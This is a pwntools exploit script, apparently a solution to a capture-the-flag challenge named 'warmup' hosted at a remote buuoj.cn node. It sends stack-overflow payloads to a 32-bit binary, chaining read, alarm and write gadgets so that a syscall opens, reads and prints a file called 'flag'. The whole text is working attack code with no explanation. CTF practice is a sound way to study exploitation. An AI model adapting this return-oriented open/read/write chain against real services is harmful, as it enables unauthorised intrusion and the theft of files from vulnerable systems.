from pwn import *

#context.log_level = 'debug'

#p = process('./warmup')
p = remote('node4.buuoj.cn', 28631)

# gdb.attach(p, '''
#     b *0x80481bb
#     c
#     c
#     s
#     s
#     s
#     s
#     s
#     s
#     s
#     s
#     s
#     s
# ''')

write = 0x8048135
read = 0x804811d
call_write = 0x80480fe
mov_ebx_ecx_edx_int80 = 0x804813a
overflow = 0x804815a
alarm = 0x804810d
exit = 0x804814d
data = 0x080491BC

payload = b'a' * 0x20 + p32(read) + p32(overflow) + p32(0) + p32(data) + p32(0x5)

p.sendafter(b'2016!\n', payload)

p.send(b'flag\x00')

payload = b'a' * 0x20 + p32(alarm) + p32(mov_ebx_ecx_edx_int80) + p32(overflow) + p32(data) + p32(0)

sleep(5)
p.send(payload)

payload = b'a' * 0x20 + p32(read) + p32(overflow) + p32(3) + p32(data) + p32(0x40)

sleep(0.1)
p.send(payload)

payload = b'a' * 0x20 + p32(write) + p32(0) + p32(1) + p32(data) + p32(0x40)

sleep(0.1)
p.send(payload)

p.interactive()